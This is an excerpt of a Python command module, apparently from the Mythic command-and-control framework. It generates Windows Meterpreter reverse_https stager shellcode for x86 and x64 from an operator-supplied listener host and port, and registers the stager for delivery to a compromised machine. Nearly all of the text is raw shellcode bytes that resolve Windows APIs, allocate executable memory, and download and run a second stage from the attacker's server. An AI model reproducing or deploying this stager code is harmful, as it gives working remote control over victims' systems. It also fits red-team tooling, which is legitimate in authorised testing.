...
class MeterpreterCommand(CommandBase):
    ...
    async def create_tasking(self, task: MythicTask) -> MythicTask:
        ...
        if task.args.get_arg("arch").lower() == "x86":
            ...
            if task.args.get_arg("payload_type").lower() == "reverse_https":
                resp = await MythicFileRPC(task).register_file(
                    build_meterpreter_reverse_https_86(task.args.get_arg("lhost"),
                                                      task.args.get_arg("lport")))
        ...
        if task.args.get_arg("arch").lower() == "x64":
            ...
            if task.args.get_arg("payload_type").lower() == "reverse_https":
                resp = await MythicFileRPC(task).register_file(
                    build_meterpreter_reverse_https_64(task.args.get_arg("lhost"),
                                                      task.args.get_arg("lport")))
...
def build_meterpreter_reverse_https_86(IP, port):
    buf = b""
    buf += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b"
    buf += b"\x52\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b"
    ...
    buf += port.to_bytes(2, 'little')
    buf += b"\x00\x00"
    buf += b"\xe8\x5a\x01\x00\x00\x2f\x77\x4f\x4d\x5f\x79\x41\x49"
    buf += b"\x55\x78\x48\x30\x43\x4a\x77\x4d\x6d\x58\x5a\x49\x43"
    buf += b"\x49\x51\x48\x47\x67\x5a\x68\x68\x7a\x6a\x68\x7a\x70"
    buf += b"\x5a\x53\x56\x58\x34\x58\x44\x46\x37\x75\x4c\x58\x72"
    buf += b"\x6d\x4b\x35\x2d\x56\x37\x39\x38\x59\x39\x73\x4c\x32"
    buf += b"\x68\x33\x79\x34\x62\x2d\x72\x70\x61\x37\x30\x75\x48"
    buf += b"\x4b\x69\x36\x62\x76\x6f\x42\x51\x33\x79\x39\x38\x39"
    buf += b"\x37\x35\x44\x66\x48\x6f\x38\x53\x59\x4c\x46\x6f\x62"
    buf += b"\x44\x5f\x4f\x7a\x75\x6e\x34\x5f\x48\x37\x5a\x79\x4b"
    buf += b"\x39\x78\x47\x76\x61\x45\x76\x6c\x47\x4f\x51\x4b\x4e"
    buf += b"\x46\x6f\x49\x5a\x51\x37\x62\x50\x4d\x69\x76\x43\x4f"
    buf += b"\x6a\x46\x38\x37\x2d\x4b\x63\x4e\x43\x52\x4f\x75\x62"
    buf += b"\x31\x69\x6e\x2d\x30\x67\x41\x64\x4d\x53\x49\x5f\x43"
    buf += b"\x37\x66\x4a\x79\x5a\x78\x62\x43\x4e\x57\x62\x56\x71"
    buf += b"\x53\x4b\x31\x4c\x6e\x4d\x75\x63\x6a\x4b\x36\x4b\x44"
    buf += b"\x47\x66\x62\x79\x64\x2d\x64\x4b\x4a\x79\x79\x67\x00"
    buf += b"\x50\x68\x57\x89\x9f\xc6\xff\xd5\x89\xc6\x53\x68\x00"
    buf += b"\x32\xe8\x84\x53\x53\x53\x57\x53\x56\x68\xeb\x55\x2e"
    buf += b"\x3b\xff\xd5\x96\x6a\x0a\x5f\x68\x80\x33\x00\x00\x89"
    buf += b"\xe0\x6a\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff"
    buf += b"\xd5\x53\x53\x53\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5"
    buf += b"\x85\xc0\x75\x14\x68\x88\x13\x00\x00\x68\x44\xf0\x35"
    buf += b"\xe0\xff\xd5\x4f\x75\xcd\xe8\x4b\x00\x00\x00\x6a\x40"
    buf += b"\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x53\x68\x58"
    buf += b"\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7\x57\x68\x00"
    buf += b"\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85"
    buf += b"\xc0\x74\xcf\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3"
    buf += b"\x5f\xe8\x6b\xff\xff\xff"
    buf += IP.encode()
    buf += b"\x00\xbb\xf0\xb5\xa2\x56"
...
def build_meterpreter_reverse_https_64(IP, port):
    buf = b""
    buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41"
    buf += b"\x50\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60\x48"
    buf += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d"
    buf += b"\x31\xc9\x48\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c"
    buf += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
    buf += b"\x48\x8b\x52\x20\x8b\x42\x3c\x41\x51\x48\x01\xd0\x66"
    buf += b"\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80"
    buf += b"\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x44"
    buf += b"\x8b\x40\x20\x49\x01\xd0\x8b\x48\x18\x50\xe3\x56\x48"
    buf += b"\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48"
    buf += b"\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38\xe0\x75"
    buf += b"\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
    buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b"
    ...
    buf += port.to_bytes(2, 'little')
    buf += b"\x00\x00\x4d\x31\xc9\x53\x53\x6a\x03\x53\x49\xba\x57"
    buf += b"\x89\x9f\xc6\x00\x00\x00\x00\xff\xd5\xe8\xc9\x00\x00"
    buf += b"\x00\x2f\x73\x41\x32\x6a\x74\x68\x42\x43\x54\x31\x47"
    buf += b"\x6a\x67\x36\x4b\x42\x5f\x44\x64\x63\x73\x51\x75\x35"
    buf += b"\x53\x51\x6e\x6a\x4f\x59\x2d\x53\x36\x41\x78\x47\x64"
    buf += b"\x41\x64\x32\x36\x4b\x64\x67\x75\x35\x63\x73\x51\x6d"
    buf += b"\x4c\x43\x4c\x5a\x58\x72\x30\x4d\x30\x38\x4b\x59\x33"
    buf += b"\x6d\x39\x4a\x7a\x74\x6b\x67\x31\x69\x74\x34\x49\x33"
    buf += b"\x55\x33\x35\x48\x5f\x76\x53\x56\x74\x52\x58\x56\x4b"
    buf += b"\x35\x4d\x55\x35\x4f\x56\x32\x44\x30\x6b\x71\x38\x4e"
    buf += b"\x62\x76\x73\x62\x57\x41\x48\x35\x62\x45\x73\x50\x50"
    buf += b"\x49\x4f\x69\x33\x58\x6c\x72\x6c\x31\x50\x36\x61\x61"
    buf += b"\x51\x4f\x48\x47\x33\x75\x65\x75\x2d\x59\x6f\x68\x57"
    buf += b"\x4a\x73\x5f\x4d\x58\x2d\x5f\x4e\x38\x57\x37\x5a\x78"
    buf += b"\x56\x6b\x4e\x4f\x76\x74\x56\x6c\x50\x72\x6c\x6c\x4b"
    buf += b"\x44\x57\x4d\x68\x4a\x47\x33\x4b\x30\x51\x2d\x4a\x79"
    buf += b"\x37\x74\x51\x63\x69\x39\x48\x70\x73\x52\x66\x47\x6f"
    buf += b"\x63\x35\x45\x5f\x74\x44\x00\x48\x89\xc1\x53\x5a\x41"
    buf += b"\x58\x4d\x31\xc9\x53\x48\xb8\x00\x32\xa8\x84\x00\x00"
    buf += b"\x00\x00\x50\x53\x53\x49\xc7\xc2\xeb\x55\x2e\x3b\xff"
    buf += b"\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1\x6a\x1f\x5a"
    buf += b"\x52\x68\x80\x33\x00\x00\x49\x89\xe0\x6a\x04\x41\x59"
    buf += b"\x49\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff\xd5\x4d"
    buf += b"\x31\xc0\x53\x5a\x48\x89\xf1\x4d\x31\xc9\x4d\x31\xc9"
    buf += b"\x53\x53\x49\xc7\xc2\x2d\x06\x18\x7b\xff\xd5\x85\xc0"
    buf += b"\x75\x1f\x48\xc7\xc1\x88\x13\x00\x00\x49\xba\x44\xf0"
    buf += b"\x35\xe0\x00\x00\x00\x00\xff\xd5\x48\xff\xcf\x74\x02"
    buf += b"\xeb\xaa\xe8\x55\x00\x00\x00\x53\x59\x6a\x40\x5a\x49"
    buf += b"\x89\xd1\xc1\xe2\x10\x49\xc7\xc0\x00\x10\x00\x00\x49"
    buf += b"\xba\x58\xa4\x53\xe5\x00\x00\x00\x00\xff\xd5\x48\x93"
    buf += b"\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x49\xc7"
    buf += b"\xc0\x00\x20\x00\x00\x49\x89\xf9\x49\xba\x12\x96\x89"
    buf += b"\xe2\x00\x00\x00\x00\xff\xd5\x48\x83\xc4\x20\x85\xc0"
    buf += b"\x74\xb2\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd2\x58"
    buf += b"\xc3\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff"
    buf += b"\xd5"
